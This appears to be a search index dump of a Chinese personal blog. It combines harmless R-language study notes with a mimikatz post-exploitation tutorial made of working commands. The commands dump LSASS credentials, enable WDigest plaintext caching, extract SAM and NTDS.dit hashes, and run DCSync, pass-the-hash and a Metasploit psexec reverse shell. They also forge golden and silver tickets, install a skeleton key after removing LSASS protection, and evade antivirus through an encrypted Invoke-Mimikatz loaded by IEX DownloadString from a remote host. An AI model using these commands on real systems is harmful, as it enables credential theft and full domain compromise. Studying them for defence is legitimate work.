boxplot(wt,main=\"Boxplot of wt\") par(opar) detach(mtcars) # layout # 两行两列，1,1,2,3第一行第一个和第二个是第一个图形，第二行第一列是第二个图形，第二行第二列是第三个图（相当于把矩阵的数字排列进去） layout(martrix(c(1,1,2,3)), 2,2, byrow=TRUE) # 精确控制每幅图像大小，使用width和和height.控制每列的宽度width=c(3,1)表示第一列占3/4 # 如果高度和宽度调整的不合适有可能图幅占不下显示不全 layout(martrix(c(1,1,2,3)), 2,2,width=c(3,1), height=c(1,2),byrow=TRUE) 图形精细控制： par(fig(0, 0.8, 0, 0.8), new=TRUE) # 画布左下角位置是0,0，右上角为0.8,0.8, new=TRUE会在图形上继续添加 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:2","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R基本的数据管理 一个示例： 在数据框中创建新变量 mydada \u003c- data.frame(x1=c(2,3,4,5), x2=c(2,5,7,9)) #求和（和的一列会加入数据框） mydata$sumx \u003c- mydata$x1 + mydata$x2 #求平均值 mydata$meanx \u003c- (mydata$x1 + mydata$x2)/2 变量的重编码（把连续的数字变成某字符串） #比如对上述例子的年龄进行重编码 #如：定义年龄为99的时候为空值 survey \u003c- data.frame(......) survey$age[survey$age == 99] \u003c- Na #如：定义年龄\u003e75的时候定义为老年人 survey$age[survey$age \u003e 75] \u003c- \"老年人\" #如：定义年龄\u003c75并且\u003e55的时候的时候定义为中年人 survey$age[survey$age \u003e 55 \u0026 survey$age \u003c 75] \u003c- \"中年人\" 变量的重命名 # 可以通过fix 调用可视化界面修改 fix(survey) # 也可以使用names() names(survey)[6] \u003c- \"question1\" # 数据框[第几个值] 处理缺失值(NA) x \u003c- c(1,2,NA) # is.na() 判断是否为空，返回bool is.na(x) is.na(survey[,6:10]) # 判断第6-10列中是否有空值 # 不能使用 x == NA 这种方式判断 # 返回缺失值的位置 which(is.na(A)) #计算数据集A的缺失值总数 sum(is.na(A)) # 对NA值进行删除 y \u003c- sum(x, na.rm=TRUE) # y返回x的和，对NA值进行删除 # 这种会删除空值所在的一整行: data \u003c- na.omit(survey) 日期值的使用 # as.Date() 将字符串转换为日期 mydate \u003c- as.Date(\"2022-04-14\") # \"2022-04-14\" mydate1 \u003c- c(\"04/14/2022\", \"04/13/2022\") date \u003c- as.Date(mydate1, \"%m/%d/%Y\") # 自定义显示格式 # Sys.Date() 返回系统日期 # date() 返回系统日期+时间 # format() 格式化输出 today \u003c- Sys.Date() format(today, format=\"%B %d %Y\") # 自定义格式化输出 # 天数减法 startdate \u003c- as.Date(\"2022-01-02\") enddate \u003c- as.Date(\"2022-04-15\") days \u003c- enddate - startdate 数据类型的判断及转换 a \u003c- c(2,5,7) is.numeric(a) is.vertor(a) b \u003c- as.character(a) is.numeric(b) 数据排序 # order() 函数 data \u003c- survey[order(survey$age),] # 以survey的age来排序，默认升序, 加逗号表示对行排序，不加逗号表示对列排序！！！ # 降序，加负号 data \u003c- survey[-order(survey$age),] data2 \u003c- survey[order(survey$gender, survey$age),] # 先按性别排序，再按年龄排序 数据集合并 # 列合并cbind()和merge() x \u003c- matrix(c(1,2,3,4,5,6,7,8,9), nrow=3, ncol=3) y \u003c- x z \u003c- cbind(x,y) # 合并x和y # 或者用merge(根据字段k1进行连接，类似sql中的联合) z1 \u003c- merge(x,y, by=\"k1\") # 行合并 rbind() # 前提：变量数目的列数必须相同 数据集子集的抽取 # 方式1： q \u003c- survey[,6:10] # 选取第6-10列 # 方式2：去除某部分 x \u003c- survey[,-2] # 去掉第二列 # 按照条件选取，显示q1到q4列 newdata \u003c- subset(surver, age\u003e=35 | age\u003c24, select=c(q1,q2,q3,q4)) 随机抽样函数 # sample() sample(x, size, replace=FALSE) # 从x中抽取size个，replace=FALSE表示不放回抽样 mysample \u003c- survey[sample(5,3,replace=FALSE),] ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的高级数据管理 数学函数 # abs() 求绝对值 # sqrt() 求平方根 # ceiling(x) 不小于x的最小整数 # floor(3.567) 不小于x的最大整数 # round(3.55) 四舍五入 # sin() 三角函数 # cos() # log(10) 对数函数 统计函数 x \u003c- c(2,3,4,1,3,7,4,9,10) mean(x) # 求均值 sum(x) # 求均值也可以这样 n \u003c- sum(x)/length(x) # 求标准差 sd(x) # 求方差 var(x) # 求最大最小值 min(x) max(x) # 标准化 scale(x) # 默认对向量x使用均值为0标准差为1的 概率函数： x \u003c- pretty(c(-3,3), 30) y \u003c- dnorm(x) # 正态分布 plot(y) # 随机正态分布函数：生成50个，均值为20，标准差为8的 rnorm(50，mean=20, sd=8) # 生成一个服从正态分布的伪随机函数 runif(5) # set.seed(12) # 先设定种子数 runif(5) # 其他函数 字符处理函数 # nchar() 统计字符数量 nchar(\"dddf\") # 根据索引提取 substr(\"sahiu\", 3,5) # 查找（从向量中查找a） grep(\"a\", c(\"b\",\"a\",\"c\",\"t\")) #字符串中a替换为A sub(\"a\",\"A\", \"abcde\") # strsplit()在字符串分割 strsplit(\"abcde\", \"c\") # 以c分割 strsplit(\"abcde\", \"\") # 每个字符单独分开 # 字符串连接 paste(\"Thec\", \"Her is me.\") # 大小写转换 toupper(\"abc\") tolower(\"ABC\") 其他实用函数 length() # 获取长度 rep(1:3, 5) # 将1到3重复5次 cat(\"hello\") # 输出到屏幕上 将之前的函数应用于矩阵和数据框中： a \u003c- c(1,2,4,5,6) round(a) # 对所有值取 b \u003c- matrix(runif(12), nrow=3) log(b) # 针对全体进行对数 mean(b) # apply() 将函数范围应用到数据库或数组某个维度 c \u003c- matrix(rnorm(12), nrow=6, ncol=5) # 5列6行的服从正态的 apply(c ,1, mean) # 对c矩阵，按行就平均值 apply(c ,2, mean) # 对c矩阵，按列就平均值 # lapply sapply 针对列表的单独操作 重复和循环 循环： # for for(i in 1:5) print(\"hello\") # 循环1-5 # while x \u003c- 5 while(x \u003e 0) {print(\"Hello\"); x\u003c- x-1} # 语句之间用分号 条件执行： # if-else if(x != 1) print(\"male\") else print(\"female\") # ifelse 满足条件执行1，不满足执行2 ifelse(条件, 语句1, 语句2) # switch felling \u003c- c(\"sad\", \"glad\", \"afraid\") for(i in felling) print(switch(i, glad = \"我很开心\", afraid = \"害怕\", sad=\"悲伤\") # 如果i等于glad... 转置 # T cars \u003c- mtcars[1:5, 1:4] # 取1-5行，1-4列 # 转置矩阵 t(cars) 其他内容课余时间多学 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"R的基本图形 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"条形图 本节例子需要使用vcd包进行演示，install.packages('vcd') 简单的条形图 barplot() library(vcd) #barplot(height) 最简单的方式，指定高度，默认垂直 barplot(c(1,2,4,6,2,7)) barplot(c(1,2,4,6,2,7), horiz=TRUE) # 水平的图 # 示例数据：关节炎病人的治疗情况 #Arthritis counts \u003c- table(Arthritis$Improve) barplot(counts) 堆砌、分组条形图 绘制的数据不再仅仅是一个向量，而是矩阵 堆砌条形图： # barplot counts \u003c- table(Arthritis$Improve,Arthritis$Treatment) # 矩阵的形式 barplot(counts) # 默认是堆砌的条形图 分组条形图： barplot(counts, beside=TRUE) # beside=TRUE 值是并列的，不是堆砌的 均值条形图 # 使用数据集 state.region, state.x77 head(state) states \u003c- data.frame(state.region, state.x77) x \u003c- aggregate(states$Illiteracy, by=list(state.region), FUN=mean) # 统计地区的文盲率 barplot(x$x, names.arg=x$Group.1) # 画图并指定坐标名字 条形图的微调 par(mar=c(5,8,4,2)) # 指定绘图区域范围 counts \u003c- table(Arthritis$Improve,Arthritis$Treatment) par(las=2) # 标签由竖的旋转为横的 barplot(counts, horiz=TRUE, cex.names=0.8, names.arg=c(\"没有治疗的\",\"一些治疗的\", \"显著治疗的\")) ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:1","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"饼图 饼图： pie() 饼图缺陷：无法明确比较谁大谁小或相差多少 # pie(x, label) # 参数1是数值向量，参数2是各个扇形标签的向量 par(mfrow=c(2,2)) # 画图区域分为四部分 x \u003c- c(10,12,4,16,8) lab \u003c- c(\"国家1\",\"国家2\",\"国家3\", \"国家4\", \"国家5\") pct \u003c- rouund(x/sum(x)*100) labl \u003c- c(lab, \" \", \"pct\", %, sep=\" \") # 自定义拼接制作标签 pie(x, labl, col=rainbow(length(labl)),main=\"简要饼图\") # 指定名称, col=rainbow指定颜色 3D饼图 # 借助包：plotrix library(plotrix) pie3D(x, labl, explode=0.1, main=\"3D饼图\") # explode=0.1指定饼之间的裂隙 扇图： 扇图可以明确比较大小 fan.plot(x, labels=lab, main=\"扇图\") ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:2","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"直方图 柱条组成的，特点：x轴上将值域分成等分的组 hist()函数 #hist(x) x \u003c- mtcars$mpg # 最简单的直方图 hist(x) hist(x, breaks=12, col=\"red\", xlab=\"每英里加仑数\") # x轴上划分为12组 # freq=False则y轴上不显示频数而是概率密度 hist(x, freq=FALSE, breaks=12, col=\"green\", xlab=\"每英里加仑数\") # 添加数值的噪声（如下图的小竖线） rug(jitter(x)) # 添加轴虚线 lines(density(x), col=\"red\", lwd=2) # lwd是线的宽度 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:3","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"核密度图 x轴展现是值，y轴是反映x轴值上密度的情况 可以很直观了解，比如不同条件下的变化情况 # 先用density处理 x \u003c- density(mtcars$mpg) # 生成核密度图 plot(x) 描述4缸或6缸汽车不同的耗油量的对比： attach(mtcars) library(sm) # 比较 sm.density.compare(x, factory) sm.density.compare(mpg, cyl, xlab=\"英里每加仑\") ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:4","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"箱线图 分位数 **箱线图元素：**最小值、四分(之一)位数、中位数、四分(之三)为主、最大值、异常值 # boxplot() boxplot(mtcars$mpg, main=\"箱线图\", ylab=\"公里每加仑\") # boxplot(mpg~cyl, data=mtcars, main=\"箱线图\", ylab=\"公里每加仑\", xlab=\"汽缸数\") # 可以看到6缸的是比较稳定的(上下窄) # 做质量检测的时候经常用到 ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:5","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["R语言"],"content":"实例分析–预测海藻数量 预测海藻数量 1.问题描述与目标： 2.数据集的导入： # 以上数据集在 DMwR 包中 install.packages(\"DMwR2\") library(\"DMwR2\") # 先了解一下数据 head(algae) summary(algae) # 这里可以查看一下化学属性的图形 hist(algae$mxPH, prob=T, ylim=0:1) # prob表示显示概率密度 lines(density(algae$mxPH, na.rm=T)) 3.数据预处理 查找缺失值： # 返回存在缺失值所在行的行数 algae[!complete.cases(algae), ] # 返回存在多个缺失值的位置 manyNAs(algae) manyNAs(algae, 0.2) # 如果属性缺失超过所有缺失的20%就记录下来 缺失值的处理： # F1:将含有缺失值的记录删除 x \u003c- algae y \u003c- na.omit() y[!complete.case(y),] # 可以发现没有缺失值了 x \u003c- algae[-c(62,199),] # 对于缺失值较多的情况，指定缺失值较多行来删掉 manyNAs(x) # F2:根据变量之间相关关系填补缺失值 #首先要找数据间的相关关系 symnum(cor(algae[,4:18], use=\"complete.obs\")) # 得到4-18字段之间的相关关系 x \u003c- algae[-manyNAs(algae), ] lm(PO4~oPO4) # F3:根据案例之间相似性来填补 求距离值，把差值最小的依次排序，... 4.获取预测模型 x \u003c- algae[-manyNAs(algae), ] clean.algae \u003c- knnImputation(algae,k=10) # 通过元素相似性的方法处理了缺失值 clean.algae # 第一个模型 lm.a1 \u003c- lm(a1 ~., data=clean.algae[, 1:12]) # a1 ~. 代表a1和所有其他数据字段建立的相关关系 summary(lm.a1) 调整后的R的平方越接近1，就说明模型越科学 5.预测模型的调优： anova(lm.a1) # 如下图：说明season是对拟合误差的贡献是最小的，所以season对a1影响小，把a1去除 # 去除a1 lm2.a1 \u003c- update(lm.a1, . ~. -season) # 发现Adjusted R-squared: 0.3259 已经变小了 # 对lm.a2进行分析，发现影响最小的是Chla字段，去掉Chla字段继续更新模型，不断重复来观察R平方的值是否越变越好 lm3.a1 \u003c- update(lm1.a, . ~. -Chla) # 来比较两个模型 anova(lm.a1, lm2.a1) 为了简化上述不断重复来减小误差，R提供了一个更加简便的函数：step() final.lm \u003c- step(lm.a1) # 提升了模型预测精确度 summary(final.lm) # 如果想要提高预测精度，也可以选用其他分析模型 熟能生巧，以后多利用R来处理生活中的简单问题！ ","date":"2022-04-15","objectID":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:16:0","tags":["R语言","编程语言","科研"],"title":"R语言入门学习篇一","uri":"/r%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"标准模块： standard - 标准模块 [Basic commands (does not require module name)] crypto - 密码模块 sekurlsa - sekurlsa模块[枚举凭据的一些命令…] kerberos - kerberos包模块 privilege - 特权模块 process - 流程模块 service - 服务模块 lsadump - LsaDump模块 ts - 终端服务器模块 event - 事件模块 misc - 杂项模块 token - 令牌操作模块 vault - Windows保管库/凭据模块 minesweeper - 扫雷艇模块 net - dpapi - dpapi模块（通过API或原始访问）[数据保护应用程序编程接口] busylight - busylight模块 sysenv - 系统环境值模块 sid - 安全标识符模块 iis - IIS XML配置模块 rpc - mimikatz的rpc控制 sr98 - 用于sr98设备和T5577目标的射频模块 rdm - （830 AL）设备的RF模块 acr - acr模块 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"基础用法：获取windows系统明文密码及HASH 1.提权 由于是要操纵系统内存的，所以需要Debug权限 privilege::debug # Mimikatz 需要此权限，因为它要与 LSASS 进程交互。因此，将此权限仅设置为需要这权限的特定用户或组，并将其从本地管理员中删除是非常重要。可以通过将策略定义为不包含任何用户或组来禁用 SeDebugPrivilege。 # Group Policy Management Editor -\u003e Windows Settings -\u003e Security Settings -\u003e Local Policies -\u003e User Rights Assignment -\u003e Debug programs -\u003e Define these policy settings: 2.抓取 sekurlsa::logonPasswords 如果报错，可能是注册表问题，尝试在cmd中输入如下命令（管理员模式） reg add hklm\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential 原理： 当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码 注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。 mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:1","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"获取系统HASH 本地执行： #提升权限 privilege::debug #抓取密码 sekurlsa::logonpasswords 当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。如下： cmd修改注册表命令： Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f #重启或用户重新登录后可以成功抓取 SAM表获取hash: # 非在线获取，没有将mimikatz传到目标机器上去，就要想办法将这两个文件获取下来（需要管理员权限） #导出SAM数据 reg save HKLM\\SYSTEM SYSTEM reg save HKLM\\SAM SAM #使用mimikatz提取hash lsadump::sam /sam:SAM /system:SYSTEM Procdump+Mimikatz： 当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe: # 先使用procdump导出文件 procdump.exe -accepteula -ma lsass.exe lsass.dmp # 再将lsass.dmp下载到本地后，然后执行mimikatz: mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit # 为了方便复制与查看，还可以输出到本地文件里面： mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" \u003e pssword.txt ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:2","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"读取域控中域成员Hash 域控本地读取 注：得在域控上以域管理员身份执行mimikatz 方法一：直接执行 #提升权限 privilege::debug #抓取密码 lsadump::lsa /patch **方法二：**通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取： #获取所有域用户 lsadump::dcsync /domain:test.com /all /csv #指定获取某个用户的hash lsadump::dcsync /domain:test.com /user:test 导出域成员Hash 域账户的用户名和hash密码以域数据库的形式存放在域控制器的 %SystemRoot%\\ntds\\NTDS.DIT 文件中。 这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库： #创建快照 ntdsutil snapshot \"activate instance ntds\" create quit quit #加载快照 ntdsutil snapshot \"mount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}\" quit quit #文件副本 copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit 将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash： Copysecretsdump.py -ntds.dit -system system.hive LOCAL 最后记得卸载删除快照： ntdsutil snapshot \"unmount {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}\" quit quit ntdsutil snapshot \"delete {72ba82f0-5805-4365-a73c-0ccd01f5ed0d}\" quit quit secretsdump脚本直接导出域hash 可以直接导出，说白了，简单粗暴： Copypython secretsdump.py rabbitmask:123456@192.168.15.181 首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:3","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"哈希传递攻击(PTH) 工作组环境 当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。 #使用administrator用户的NTLM哈希值进行攻击 sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 #使用test用户的NTLM哈希值进行攻击 sekurlsa::pth /user:test /domain:192.168.10.15 /ntlm:329153f560eal81eea55e66a1e8 在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。 注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。 域环境 在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值 #使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击 sekurlsa::pth /user:administrator /domain:\"testyu.com\" /ntlm:dbd621b8ed24eb627d32514476fac6c5 #使用域用户test的NTLM哈希值对域控进行哈希传递攻击 sekurlsa::pth /user:test /domain:\"testyu.com\" /ntlm:329153f560eb329c0e1deea55e88a1e9 MSF进行哈希传递 有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 exploit/windows/smb/psexec 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。 msf \u003e use exploit/windows/smb/psexec msf exploit(psexec) \u003e set payload windows/meterpreter/reverse_tcp msf exploit(psexec) \u003e set lhost 192.168.10.27 msf exploit(psexec) \u003e set rhost 192.168.10.14 msf exploit(psexec) \u003e set smbuser Administrator msf exploit(psexec) \u003e set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #这里LM和NTLM我们已经获取到了 msf exploit(psexec) \u003e exploit ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:4","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"票据传递攻击(PTT) 黄金票据 域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。 首先获取krbtgt的用户hash: mimikatz \"lsadump::dcsync /domain:xx.com /user:krbtgt\" 利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下： kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#导入刚才生成的票据 kerberos::ptt test.kiribi #导入成功后可获取域管权限 dir \\\\dc.abc.com\\c$ 白银票据 黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信 白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信 #在域控上导出 DC$ 的 HASH mimikatz log \"privilege::debug\" \"sekurlsa::logonpasswords\" #利用 DC$ 的 Hash制作一张 cifs 服务的白银票据 kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt #cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统 dir \\\\DC.ABC.COM\\C$ skeleton key skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。 Copy#在域控上安装 skeleton key mimikatz.exe privilege::debug \"misc::skeleton\" #在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz net use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator 微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。 Copy#适用系统 windows 8.1 windows server 2012 及以上 当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下: Copyprivilege::debug !+ !processprotect /process:lsass.exe /remove misc::skeleton MS14-068 当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。 MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。 Copysysteminfo |find \"3011780\" #为空说明该服务器存在MS14-068漏洞 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:5","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"导出chrome密码 https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==\u0026mid=2247483949\u0026idx=1\u0026sn=db4853c88e4bf0a550c095d9017a363c\u0026chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d\u0026mpshare=1\u0026scene=23\u0026srcid=\u0026sharer_sharetime=1582350092849\u0026sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd 也有其他工具 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:6","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"免杀 Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。 首先在本地对Invoke-Mimikatz.ps1进行加密处理： Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1 poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数 #默认生成的文件是evil.ps1 -Password 设置加密的密钥 -Salt 随机数，防止被暴力破解 将加密生成的evil.sp1脚本放在目标机上，执行如下命令： Copy#远程加载解密脚本 poweshell.exe IEX(New-Object Net.WebClient).DownloadString(\"http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1\") [String] $cmd = Get-Content .\\evil.ps1 Invoke-Expression $cmd $decrypted = de password salt Invoke-Expression $decrypted Invoke-Mimikatz 也可以自己修改mimikatz源码进行免杀。 ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:7","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":"转载\u0026参考 https://www.cnblogs.com/-mo-/p/11890232.html ","date":"2022-02-08","objectID":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:8","tags":["mimikatz","后渗透"],"title":"mimikatz学习笔记","uri":"/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["渗透测试"],"content":" 虽然我技术菜，也来晚了，但是我也在一点点进步，不是吗？ 